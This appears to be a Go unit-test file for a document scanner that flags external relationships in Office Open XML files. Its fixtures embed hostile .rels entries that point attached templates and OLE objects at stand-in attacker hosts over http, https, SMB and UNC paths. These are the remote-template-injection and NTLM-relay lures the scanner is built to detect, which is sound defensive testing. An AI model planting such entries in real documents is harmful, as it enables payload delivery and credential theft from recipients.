package extract

import (
	"archive/zip"
	"bytes"
	"fmt"
	"testing"
	"time"
)

// makeOOXMLWithRels builds a minimal in-memory OOXML zip with the given .rels
// content stored at word/_rels/settings.xml.rels. Pass "" for relsXML to get a
// zip with no .rels entry (used for the macro-free baseline).
func makeOOXMLWithRels(t *testing.T, relsXML string) []byte {
	t.Helper()
	var b bytes.Buffer
	zw := zip.NewWriter(&b)

	// word/document.xml — required so isOfficeZip recognises it as OOXML.
	addZipEntry(t, zw, "word/document.xml", `<?xml version="1.0" encoding="UTF-8"?><w:document/>`)

	if relsXML != "" {
		addZipEntry(t, zw, "word/_rels/settings.xml.rels", relsXML)
	}

	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

func addZipEntry(t *testing.T, zw *zip.Writer, name, body string) {
	t.Helper()
	w, err := zw.Create(name)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := w.Write([]byte(body)); err != nil {
		t.Fatal(err)
	}
}

// TestOOXMLExternalRel_HTTP checks that an attachedTemplate relationship
// pointing to an http:// URL is surfaced as an OOXML-EXTERNAL-REL stream.
func TestOOXMLExternalRel_HTTP(t *testing.T) {
	relsXML := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="http://evil.example/t.dotm"
    TargetMode="External"/>
</Relationships>`

	buf := makeOOXMLWithRels(t, relsXML)
	res := Extract(buf, time.Time{})

	if !res.IsDoc {
		t.Fatal("OOXML zip not flagged IsDoc")
	}

	joined := bytes.Join(res.Streams, []byte("\n"))
	if !bytes.Contains(joined, []byte("OOXML-EXTERNAL-REL")) {
		t.Fatalf("no OOXML-EXTERNAL-REL stream emitted; streams=%d joined=%q", len(res.Streams), joined)
	}
	if !bytes.Contains(joined, []byte("http://evil.example/t.dotm")) {
		t.Fatalf("external URL not in emitted stream; got %q", joined)
	}
}

// TestOOXMLExternalRel_HTTPS checks the https:// scheme variant.
func TestOOXMLExternalRel_HTTPS(t *testing.T) {
	relsXML := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
    Target="https://attacker.example/payload.dat"
    TargetMode="External"/>
</Relationships>`

	buf := makeOOXMLWithRels(t, relsXML)
	res := Extract(buf, time.Time{})
	joined := bytes.Join(res.Streams, []byte("\n"))
	if !bytes.Contains(joined, []byte("OOXML-EXTERNAL-REL")) {
		t.Fatalf("no OOXML-EXTERNAL-REL stream for https target; got %q", joined)
	}
	if !bytes.Contains(joined, []byte("https://attacker.example/payload.dat")) {
		t.Fatalf("https URL missing from emitted stream; got %q", joined)
	}
}

// TestOOXMLInternalRel_NoEmit is the negative case: an internal relationship
// (no TargetMode="External") must NOT produce an OOXML-EXTERNAL-REL stream.
func TestOOXMLInternalRel_NoEmit(t *testing.T) {
	relsXML := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings"
    Target="settings.xml"/>
</Relationships>`

	buf := makeOOXMLWithRels(t, relsXML)
	res := Extract(buf, time.Time{})
	joined := bytes.Join(res.Streams, []byte("\n"))
	if bytes.Contains(joined, []byte("OOXML-EXTERNAL-REL")) {
		t.Fatalf("internal rel wrongly emitted OOXML-EXTERNAL-REL; got %q", joined)
	}
}

// TestOOXMLExternalRel_LocalFile checks that a file:// URL pointing to a local
// path (file://C:/...) does NOT trigger (low-threat, FP-prone), but a UNC
// file://\\ does trigger (NTLM-relay vector).
func TestOOXMLExternalRel_LocalFileNoEmit(t *testing.T) {
	relsXML := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="file:///C:/Users/Public/template.dotm"
    TargetMode="External"/>
</Relationships>`

	buf := makeOOXMLWithRels(t, relsXML)
	res := Extract(buf, time.Time{})
	joined := bytes.Join(res.Streams, []byte("\n"))
	// file:///C:/ is a local file, not a remote target — must NOT emit.
	if bytes.Contains(joined, []byte("OOXML-EXTERNAL-REL")) {
		t.Fatalf("local file:// wrongly emitted OOXML-EXTERNAL-REL; got %q", joined)
	}
}

// TestOOXMLExternalRel_SMB checks that an smb:// Target emits a finding.
func TestOOXMLExternalRel_SMB(t *testing.T) {
	relsXML := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="smb://attacker.example/share/t.dotm"
    TargetMode="External"/>
</Relationships>`

	buf := makeOOXMLWithRels(t, relsXML)
	res := Extract(buf, time.Time{})
	joined := bytes.Join(res.Streams, []byte("\n"))
	if !bytes.Contains(joined, []byte("OOXML-EXTERNAL-REL")) {
		t.Fatalf("no OOXML-EXTERNAL-REL stream for smb:// target; got %q", joined)
	}
	if !bytes.Contains(joined, []byte("smb://attacker.example/share/t.dotm")) {
		t.Fatalf("smb:// URL missing from emitted stream; got %q", joined)
	}
}

// TestOOXMLExternalRel_UNCRaw checks that a raw UNC Target (\\server\share)
// emits a finding (NTLM relay vector).
func TestOOXMLExternalRel_UNCRaw(t *testing.T) {
	relsXML := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="\\attacker.example\share\t.dotm"
    TargetMode="External"/>
</Relationships>`

	buf := makeOOXMLWithRels(t, relsXML)
	res := Extract(buf, time.Time{})
	joined := bytes.Join(res.Streams, []byte("\n"))
	if !bytes.Contains(joined, []byte("OOXML-EXTERNAL-REL")) {
		t.Fatalf("no OOXML-EXTERNAL-REL stream for raw UNC target; got %q", joined)
	}
}

// TestOOXMLExternalRel_UNCFileURI checks that a file://\\server\share UNC URI
// Target emits a finding (NTLM relay via file URI).
func TestOOXMLExternalRel_UNCFileURI(t *testing.T) {
	relsXML := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="file://\\attacker.example\share\t.dotm"
    TargetMode="External"/>
</Relationships>`

	buf := makeOOXMLWithRels(t, relsXML)
	res := Extract(buf, time.Time{})
	joined := bytes.Join(res.Streams, []byte("\n"))
	if !bytes.Contains(joined, []byte("OOXML-EXTERNAL-REL")) {
		t.Fatalf("no OOXML-EXTERNAL-REL stream for file://\\\\ UNC URI target; got %q", joined)
	}
}

// TestOOXMLExternalRel_CumulativeCap checks that a single .rels file with more
// than maxExternalRels external relationships emits at most maxExternalRels
// OOXML-EXTERNAL-REL streams.
func TestOOXMLExternalRel_CumulativeCap(t *testing.T) {
	// Build a .rels with maxExternalRels+10 external http:// entries.
	total := maxExternalRels + 10
	relsXML := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>` + "\n"
	relsXML += `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">` + "\n"
	for i := 0; i < total; i++ {
		relsXML += fmt.Sprintf(`  <Relationship Id="rId%d" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t%d.dotm" TargetMode="External"/>`, i, i) + "\n"
	}
	relsXML += `</Relationships>`

	buf := makeOOXMLWithRels(t, relsXML)
	res := Extract(buf, time.Time{})

	count := 0
	for _, s := range res.Streams {
		if bytes.HasPrefix(s, []byte("OOXML-EXTERNAL-REL")) {
			count++
		}
	}
	if count > maxExternalRels {
		t.Fatalf("cumulative cap exceeded: got %d OOXML-EXTERNAL-REL streams, want at most %d", count, maxExternalRels)
	}
	if count == 0 {
		t.Fatal("expected at least one OOXML-EXTERNAL-REL stream, got none")
	}
}

// TestOOXMLExternalRel_MalformedRels ensures a .rels with invalid XML is
// silently skipped (fail-open) and does not cause a Failed or Panicked flag.
func TestOOXMLExternalRel_MalformedRels(t *testing.T) {
	buf := makeOOXMLWithRels(t, "<this is not valid xml >>>")
	res := Extract(buf, time.Time{})
	if res.Panicked {
		t.Error("malformed .rels caused a panic")
	}
	// Failed may be set or not (no .bin entries tried); what matters is no crash
	// and no spurious OOXML-EXTERNAL-REL stream.
	joined := bytes.Join(res.Streams, []byte("\n"))
	if bytes.Contains(joined, []byte("OOXML-EXTERNAL-REL")) {
		t.Fatalf("malformed .rels emitted OOXML-EXTERNAL-REL; got %q", joined)
	}
}
